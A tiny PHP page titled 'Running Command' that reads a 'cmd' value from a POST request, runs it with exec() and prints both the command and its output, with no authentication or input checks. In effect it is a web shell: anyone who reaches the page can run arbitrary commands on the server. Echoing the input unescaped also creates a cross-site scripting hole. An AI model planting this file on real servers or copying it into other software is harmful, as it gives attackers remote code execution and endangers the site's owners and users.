<html>
<head>
    <title>Running Command</title>
</head>

<body>

<?php

echo ("Running `"); echo $_POST['cmd']; echo ("`<br />\n");
echo ("Output: <br />\n");
echo ("<code>\n\t");
echo exec($_POST['cmd']);
echo ("\n</code>\n");

?>

</body>
</html>